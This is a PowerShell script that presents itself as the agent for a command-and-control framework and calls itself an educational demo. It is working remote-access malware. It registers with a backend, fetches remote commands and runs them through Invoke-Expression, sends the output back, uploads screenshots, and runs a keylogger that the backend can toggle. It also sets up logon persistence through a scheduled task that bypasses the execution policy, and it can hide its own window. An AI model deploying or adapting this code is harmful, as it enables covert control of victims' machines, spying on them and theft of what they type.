<#
.SYNOPSIS
    C2 Agent for JavaC2Framework (Project Demo)
.DESCRIPTION
    - Registers agent with backend
    - Fetches and executes commands
    - Sends results and screenshots
    - Keylogger (demo, off by default, toggle from backend)
    - Optional persistence via Scheduled Task
    - Optional -Hidden flag to run windowless (for demo)
    - For educational/demo use only
#>

# ====== CONFIG ======
$Server = "http://<YOUR_BACKEND_IP>:<PORT>"   # <-- Set your backend URL here
$AgentId = "$env:COMPUTERNAME-$(Get-Random)"  # Unique agent id
$PollingInterval = 5 # seconds
$ScriptPath = $MyInvocation.MyCommand.Definition
$TaskName = "JavaC2AgentDemo"

# ====== Persistence Functions ======
function Install-Persistence {
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$ScriptPath`" -Hidden"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Description "JavaC2 Agent Demo Persistence" -Force
        Write-Host "[+] Persistence installed as Scheduled Task: $TaskName"
    } catch {
        Write-Host "[!] Failed to install persistence: $_"
    }
}

function Remove-Persistence {
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Write-Host "[+] Persistence removed: $TaskName"
    } catch {
        Write-Host "[!] Failed to remove persistence: $_"
    }
}

# ====== Helper Functions ======
function Register-Agent {
    $body = @{ agentId = $AgentId; agentOs = "Windows" } | ConvertTo-Json
    Invoke-RestMethod -Uri "$Server/agents/register" -Method Post -Body $body -ContentType "application/json"
}

function Get-Command {
    Invoke-RestMethod -Uri "$Server/commands/agents/$AgentId" -Method Get
}

function Send-Result($commandId, $result) {
    $body = @{ agentId = $AgentId; commandId = $commandId; result = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result)) } | ConvertTo-Json
    Invoke-RestMethod -Uri "$Server/results" -Method Post -Body $body -ContentType "application/json"
}

function Send-Screenshot {
    $screenshotPath = "$env:TEMP\shot.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $bytes = [System.IO.File]::ReadAllBytes($screenshotPath)
    $b64 = [Convert]::ToBase64String($bytes)
    $body = @{ agentId = $AgentId; screenshot = $b64 } | ConvertTo-Json
    Invoke-RestMethod -Uri "$Server/screenshots" -Method Post -Body $body -ContentType "application/json"
    Remove-Item $screenshotPath
}

function Send-Keylog($log) {
    $body = @{ agentId = $AgentId; logText = $log } | ConvertTo-Json
    Invoke-RestMethod -Uri "$Server/keylogger/log" -Method Post -Body $body -ContentType "application/json"
}

function Is-Keylogger-Enabled {
    $resp = Invoke-RestMethod -Uri "$Server/keylogger/status/$AgentId" -Method Get
    return $resp.enabled
}

# ====== Keylogger (Demo/Educational Only) ======
function Start-Keylogger {
    # This is a demo keylogger for project showcase only.
    $global:KeylogBuffer = ""
    $global:KeyloggerEnabled = $true
    $null = [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
    $null = [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    $handler = {
        param($sender, $e)
        $global:KeylogBuffer += $e.KeyCode + " "
        if ($global:KeylogBuffer.Length -gt 100) {
            Send-Keylog $global:KeylogBuffer
            $global:KeylogBuffer = ""
        }
    }
    $form = New-Object Windows.Forms.Form
    $form.Add_KeyDown($handler)
    $form.ShowDialog()
}

# ====== Main Logic ======
param(
    [switch]$Persist,
    [switch]$RemovePersist,
    [switch]$Hidden # If set, hide the PowerShell window (for demo background mode)
)

# Hide window if -Hidden flag is set
if ($Hidden) {
    try {
        Add-Type -Name Win -Namespace PS -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern int GetConsoleWindow();
        '
        [void][PS.Win]::ShowWindow([PS.Win]::GetConsoleWindow(), 0)
    } catch {}
}

if ($Persist) { Install-Persistence; exit }
if ($RemovePersist) { Remove-Persistence; exit }

Register-Agent

while ($true) {
    try {
        $KeyloggerEnabled = Is-Keylogger-Enabled
        if ($KeyloggerEnabled -and -not $global:KeyloggerRunning) {
            Start-Job -ScriptBlock { Start-Keylogger } | Out-Null
            $global:KeyloggerRunning = $true
        }
        elseif (-not $KeyloggerEnabled -and $global:KeyloggerRunning) {
            Get-Job | Remove-Job -Force
            $global:KeyloggerRunning = $false
        }
        $cmds = Get-Command
        foreach ($cmd in $cmds) {
            $output = Invoke-Expression $cmd.command
            Send-Result $cmd.id $output
        }
        if ($cmds | Where-Object { $_.command -eq 'screenshot' }) {
            Send-Screenshot
        }
        Start-Sleep -Seconds $PollingInterval
    } catch {
        Write-Host "[!] Error: $_"
    }
} 